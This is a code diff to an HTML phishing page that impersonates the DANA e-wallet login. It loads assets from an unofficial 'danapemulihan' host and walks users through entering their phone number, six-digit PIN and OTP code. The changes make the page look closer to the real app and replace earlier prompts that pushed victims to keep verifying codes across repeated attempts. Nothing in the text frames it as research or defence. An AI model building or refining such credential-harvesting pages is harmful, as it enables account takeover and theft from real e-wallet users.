@@ -59,23 +59,31 @@
   <div class="content">
     <div class="container">
       <!-- Phone Number Page -->
-      <div id="number-page" style="display:block">
+      <div id="number-page" class="page" style="display:block">
         <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Masukkan Nomor HP Kamu</h2>
+        <h1>DANA</h1>
+        <h2>Masukkan nomor HP kamu untuk lanjut</h2>
+        
         <div class="phone-input-container">
           <div class="country-code-box">
-            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
-            <span> +62</span>
+            <span>+62</span>
           </div>
-          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
+          <input type="tel" id="phone-number" placeholder="811-1234-5678" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
         </div>
-        <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
+        
+        <p class="info-text">
+          Nomor ponsel akan digunakan sebagai ID kamu & menjaga akun selalu aman. 
+          Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan 
+          <b>Kebijakan Privasi</b> kami
+        </p>
       </div>
 
       <!-- PIN Page -->
-      <div id="pin-page" style="display:none">
+      <div id="pin-page" class="page" style="display:none">
         <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Masukkan PIN</h2>
+        <h1>DANA</h1>
+        <h2>Masukkan PIN DANA</h2>
+        
         <div class="pin-container">
           <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
           <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
@@ -84,38 +92,32 @@
           <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
           <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
         </div>
-        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
-        <div class="help-forgot-container">
-          <a href="#" class="link">Bantuan</a>
-          <a href="#" class="link">Lupa PIN?</a>
+        
+        <div class="pin-actions">
+          <span class="show-text">TAMPILKAN</span>
+          <a href="#" class="forgot-pin">LUPA PIN?</a>
         </div>
       </div>
 
       <!-- OTP Page -->
-      <div id="otp-page" style="display:none">
+      <div id="otp-page" class="page" style="display:none">
         <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Verifikasi Kode OTP</h2>
+        <h1>DANA</h1>
+        
+        <div class="otp-message-box">
+          <p><b>Tap verifikasi untuk menerima OTP</b></p>
+          <p>Kode OTP telah dikirim ke nomor Anda</p>
+        </div>
+        
         <div class="otp-container">
           <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
           <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
           <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
           <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
         </div>
-        <div class="otp-message-box"> 
-          Kode OTP telah dikirim ke WhatsApp/SMS<br>
-          <small>(Silahkan buka aplikasi dana lalu verifikasi notifikasi)</small>
-          <span id="otp-timer">02:00</span>
-        </div>
-        <div id="floating-notification" class="floating-notification" style="display:none">
-          <div id="notification-content">Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.</div>
-          <div id="attempt-counter" style="font-size:12px;margin-top:5px;display:none">Percobaan ke: <span id="attempt-number">1</span>/6</div>
-        </div>
-        <div id="reward-notification" class="notification" style="display:none"></div>
-        <div id="success-notification" class="floating-notification" style="display:none;background-color:#4CAF50">
-          terlalu sering memasukkan kode OTP Silahkan Verifikasi di aplikasi dana
-        </div>
-        <div class="verifikasi-button-container" style="display:none">
-          <button id="verifikasi-button" class="button">Verifikasi</button>
+        
+        <div class="resend-otp">
+          <span id="otp-timer">KIRIM ULANG (118s)</span>
         </div>
       </div>
     </div>
@@ -123,10 +125,10 @@
 
   <!-- Continue Button -->
   <div class="fixed-button-container" id="lanjutkan-container">
-    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+    <button id="lanjutkan-button" class="button">LANJUT</button>
   </div>
 
   <!-- JavaScript -->
   <script src="script.js"></script>
 </body>
-  </html>
+</html>
